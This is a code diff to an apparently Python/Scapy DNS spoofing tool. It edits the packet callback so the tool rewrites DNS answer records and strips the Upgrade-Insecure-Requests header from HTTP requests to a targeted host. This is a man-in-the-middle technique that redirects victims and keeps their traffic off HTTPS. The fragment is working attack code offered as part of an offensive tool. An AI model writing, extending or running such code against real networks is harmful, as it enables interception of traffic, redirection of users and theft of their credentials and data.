@@ -35,7 +35,6 @@ class Dns_spoof:
     def call_back(self, bin_packet):
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
-            packet.show()
             try:
                 queryName = packet[DNSQR].qname.decode()
                 #if queryName in self.host:
@@ -55,8 +54,8 @@ class Dns_spoof:
             bin_packet.set_payload(bytes(packet))
         elif packet.haslayer(HTTPRequest):
             try:
-                upgradeReq = packet[HTTPRequest].Upgrade_Insecure_Requests
-                if upgradeReq == 1:
+                httpHost = packet[HTTPRequest].Host.decode()
+                if self.host[0] in httpHost:
                     del packet[HTTPRequest].Upgrade_Insecure_Requests
                     del packet[IP].len
                     del packet[IP].chksum
